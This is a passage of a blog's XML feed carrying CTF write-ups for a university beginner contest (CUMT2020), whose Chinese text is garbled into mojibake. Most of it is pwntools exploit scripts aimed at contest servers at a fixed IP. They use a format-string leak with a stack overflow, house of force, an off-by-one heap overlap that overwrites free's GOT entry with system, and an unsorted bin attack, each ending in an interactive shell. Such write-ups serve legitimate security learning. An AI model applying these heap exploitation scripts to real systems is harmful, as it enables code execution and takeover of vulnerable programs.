class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line">    <span class="comment">#r.recvuntil(":")</span></span><br><span class="line">    <span class="comment">#r.sendline(name)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">free_got = heap.got[<span class="string">'free'</span>]</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'AAAA'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'AAAA'</span>) <span class="comment">#1</span></span><br><span class="line">change(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">'A'</span>*<span class="number">0x10</span> + <span class="string">"\x41"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x30</span>,p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0x20</span>) + p64(heap.got[<span class="string">'free'</span>]))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Content : "</span>)</span><br><span class="line">data = r.recvuntil(<span class="string">"Done !"</span>)</span><br><span class="line"></span><br><span class="line">free_addr = u64(data.split(<span class="string">"\n"</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = free_addr -libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">log.success(<span class="string">'libc base addr:'</span>+hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">change(<span class="number">1</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn7"><a href="#pwn7" class="headerlink" title="pwn7"></a>pwn7</h1><blockquote><p>å¾ˆç®€å•çš„unsorted bin attack,åˆ©ç”¨æ­¤æ”»å‡»ä¿®æ”¹flagä¸ºä¸€ä¸ªå¾ˆå¤§çš„æ•°å°±å¯ä»¥è·å¾—shelläº†</p><p>å…³äºunsorted bin attackå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« </p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10016</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.sendline(content)</span><br><span class="line">    <span class="comment">#r.recvuntil(":")</span></span><br><span class="line">    <span class="comment">#r.sendline(name)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">#def show(idx):</span></span><br><span class="line"><span class="comment">#    r.recvuntil(":")</span></span><br><span class="line"><span class="comment">#    r.sendline("3")</span></span><br><span class="line"><span class="comment">#    r.recvuntil(":")</span></span><br><span class="line"><span class="comment">#    r.sendline(str(idx))</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">"AAAA"</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">"AAAA"</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">"AAAA"</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="number">0x6020a0</span></span><br><span class="line">fd = <span class="number">0</span></span><br><span class="line">bk = flag - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">0</span>, <span class="number">0x20</span> + <span class="number">0x20</span>, <span class="string">"a"</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(fd) + p64(bk))</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">r.recvuntil(<span class="number">0x80</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">r.sendline(<span class="string">"666"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn8"><a href="#pwn8" class="headerlink" title="pwn8"></a>pwn8</h1><blockquote><p>addç”³è¯·çš„æ—¶å€™,å¦‚æœsizeä¸ç¬¦åˆæ¡ä»¶,ä¼šè¿”å›,è€Œeditçš„æ—¶å€™,æ²¡æœ‰æ£€æµ‹,æ‰€ä»¥é€šè¿‡æ®‹ç•™ä¿¡æ¯æ¥æ§åˆ¶æŒ‡é’ˆ,å®ç°</p><p>ä»»æ„å†™</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å¤ç°&quot;&gt;&lt;a href=&quot;#å¤ç°&quot; class=&quot;headerlink&quot; title=&quot;å¤ç°&quot;&gt;&lt;/a&gt;å¤ç°&lt;/h1&gt;&lt;p&gt;ç»ˆäºè€ƒå®Œè¯•äº†ï¼Œè¿™è€ƒå‰å­¦çœŸä¸æ˜¯äººå¹²çš„ï¼Œä¸Šè¯¾è¿˜æ˜¯å¾—å¬ä¸€å¬&lt;/p&gt;
&lt;p&gt;å¤ç°ä¸€ä¸‹è¿™å‡ é“é¢˜ï¼Œé¡ºä¾¿å­¦ä¹ å †çš„çŸ¥è¯†&lt;/p&gt;
&lt;h1 id=&quot;pwn5&quot;&gt;</summary>
      
    
    
    
    <category term="å¤ç°" scheme="https://pz1o.top/categories/%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="å¤ç°" scheme="https://pz1o.top/tags/%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="å †" scheme="https://pz1o.top/tags/%E5%A0%86/"/>
    
  </entry>
  
  <entry>
    <title>CUMT2020å…¥é—¨èµ›</title>
    <link href="https://pz1o.top/2020/11/28/CUMT2020%E5%85%A5%E9%97%A8%E8%B5%9B/"/>
    <id>https://pz1o.top/2020/11/28/CUMT2020%E5%85%A5%E9%97%A8%E8%B5%9B/</id>
    <published>2020-11-28T10:20:47.000Z</published>
    <updated>2020-11-28T12:46:19.100Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="CUMT2020å…¥é—¨èµ›"><a href="#CUMT2020å…¥é—¨èµ›" class="headerlink" title="CUMT2020å…¥é—¨èµ›"></a>CUMT2020å…¥é—¨èµ›</h1><p>æœ¬ä¸å‡†å¤‡å†™çš„ï¼Œä¸»è¦tclï¼Œè¿˜æ˜¯ç•™ä¸ªå‘ä½ç­‰è€ƒå®Œè¯•æ¥å¤ç°</p><p>ä¸»è¦å¯¹å †ä¸ç†è§£ï¼Œå¹¶ä¸”ä¸æ‡‚æ¼æ´åˆ©ç”¨ç‚¹åœ¨å“ªé‡Œ</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="test-nc"><a href="#test-nc" class="headerlink" title="test_nc"></a>test_nc</h3><p>ncè¿æ¥æ‹¿flag</p><h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwnlib <span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">from</span> pwnlib <span class="keyword">import</span> context</span><br><span class="line"><span class="keyword">from</span> pwnlib.tubes.remote <span class="keyword">import</span> remote</span><br><span class="line"><span class="keyword">from</span> pwnlib.tubes.process <span class="keyword">import</span> process</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwnlib.elf.elf <span class="keyword">import</span> ELF</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.packing <span class="keyword">import</span> make_packer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = make_packer(word_size=<span class="number">64</span>)</span><br><span class="line">bd = <span class="number">0x400756</span></span><br><span class="line"><span class="comment">#r = process("./overflow")</span></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10011</span>)</span><br><span class="line">r.recvuntil(<span class="string">b'Welcome to CTF2020!\n'</span>)</span><br><span class="line">r.recvuntil(<span class="string">b'Please input your username\n'</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b'%11$p'</span>)</span><br><span class="line">pp = r.recv()</span><br><span class="line">print(pp)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b'a'</span>*<span class="number">0x28</span> + p(int(pp, <span class="number">16</span>)) + <span class="string">b'a'</span>*<span class="number">8</span> + p(<span class="number">0x400756</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><p>æ ˆæº¢å‡º</p><h3 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h3><p>æ•´æ•°æº¢å‡º</p><p>è¾“å…¥65536</p><p>å¾—åˆ°shell</p><h3 id="pwn5-fail"><a href="#pwn5-fail" class="headerlink" title="pwn5(fail)"></a>pwn5(fail)</h3><p>å…ˆè´´expï¼Œè€ƒå®Œè¯•æ¥å­¦ä¹ </p><p>æ¼æ´ç‚¹æƒ³çš„æ˜¯ä¸€æ ·çš„</p><p>ä½†å…¶ä¸­æœ‰äº›ç»†èŠ‚ä¸å¤ªæ‡‚</p><blockquote><p>åˆ©ç”¨changeå‡½æ•°ä¸­å­˜åœ¨çš„ä»»æ„å­—èŠ‚å †æº¢å‡ºæ„é€ house of forceæ”»å‡»</p><p>å…³äºhouse of forceä¸æ‡‚å¾—çš„å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« </p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10014</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,size,name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x400D1B</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">"ddaa"</span>)</span><br><span class="line">payload = <span class="number">0x30</span> * <span class="string">'a'</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x41</span>,payload)</span><br><span class="line">offset_to_heap_base = -(<span class="number">0x40</span> + <span class="number">0x20</span>)</span><br><span class="line">malloc = offset_to_heap_base - <span class="number">0x8</span> - <span class="number">0xf</span></span><br><span class="line">add(malloc,<span class="string">"dddd"</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(magic) * <span class="number">2</span>)</span><br><span class="line">r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">r.sendline(<span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line">print(r.recv())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn6-fail"><a href="#pwn6-fail" class="headerlink" title="pwn6(fail)"></a>pwn6(fail)</h3><blockquote><p>changeå‡½æ•°ä¸­å­˜åœ¨å•å­—èŠ‚æº¢å‡ºæ¼æ´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;if ( heap[v1] ) </span><br><span class="line">&gt;&#123; printf(&quot;Content of heap : &quot;);</span><br><span class="line">read_input(heap[v1][1], *heap[v1] + 1LL);</span><br><span class="line">puts(&quot;Done !&quot;); </span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨å•å­—èŠ‚æº¢å‡ºæ¼æ´æ„é€ fake_chunk,freeä¹‹åå†æ¬¡åˆ†é…é€ æˆoverlap,ä»è€Œä»»æ„åœ°å€è¯»å†™</p><p>æ³„éœ²å‡ºlibcåŸºåœ°å€ï¼Œä¿®æ”¹gotè¡¨ï¼Œæœ€åget_shell</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10015</span>)</span><br><span class="line">heap = ELF(<span class="string">'./pwn6'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line">    <span class="comment">#r.recvuntil(":")</span></span><br><span class="line">    <span class="comment">#r.sendline(name)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">free_got = heap.got[<span class="string">'free'</span>]</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'AAAA'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'AAAA'</span>) <span class="comment">#1</span></span><br><span class="line">change(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">'A'</span>*<span class="number">0x10</span> + <span class="string">"\x41"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x30</span>,p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0x20</span>) + p64(heap.got[<span class="string">'free'</span>]))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Content : "</span>)</span><br><span class="line">data = r.recvuntil(<span class="string">"Done !"</span>)</span><br><span class="line"></span><br><span class="line">free_addr = u64(data.split(<span class="string">"\n"</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = free_addr -libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">log.success(<span class="string">'libc base addr:'</span>+hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">change(<span class="number">1</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn7-fail"><a href="#pwn7-fail" class="headerlink" title="pwn7(fail)"></a>pwn7(fail)</h3><blockquote><p>å¾ˆç®€å•çš„unsorted bin attack,åˆ©ç”¨æ­¤æ”»å‡»ä¿®æ”¹flagä¸ºä¸€ä¸ªå¾ˆå¤§çš„æ•°å°±å¯ä»¥è·å¾—shelläº†</p><p>å…³äºunsorted bin attackå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« </p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10016</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.sendline(content)</span><br><span class="line">    <span class="comment">#r.recvuntil(":")</span></span><br><span class="line">    <span class="comment">#r.sendline(name)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">#def show(idx):</span></span><br><span class="line"><span class="comment">#    r.recvuntil(":")</span></span><br><span class="line"><span class="comment">#    r.sendline("3")</span></span><br><span class="line"><span class="comment">#    r.recvuntil(":")</span></span><br><span class="line"><span class="comment">#    r.sendline(str(idx))</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">"AAAA"</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">"AAAA"</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">"AAAA"</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="number">0x6020a0</span></span><br><span class="line">fd = <span class="number">0</span></span><br><span class="line">bk = flag - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">0</span>, <span class="number">0x20</span> + <span class="number">0x20</span>, <span class="string">"a"</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(fd) + p64(bk))</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">r.recvuntil(<span class="number">0x80</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">r.sendline(<span class="string">"666"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn8-fail"><a href="#pwn8-fail" class="headerlink" title="pwn8(fail)"></a>pwn8(fail)</h3><blockquote><p>addç”³è¯·çš„æ—¶å€™,å¦‚æœsizeä¸ç¬¦åˆæ¡ä»¶,ä¼šè¿”å›,è€Œeditçš„æ—¶å€™,æ²¡æœ‰æ£€æµ‹,æ‰€ä»¥é€šè¿‡æ®‹ç•™ä¿¡æ¯æ¥æ§åˆ¶æŒ‡é’ˆ,å®ç°</p><p>ä»»æ„å†™</p></blockquote><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="MISCç­¾åˆ°é¢˜"><a href="#MISCç­¾åˆ°é¢˜" class="headerlink" 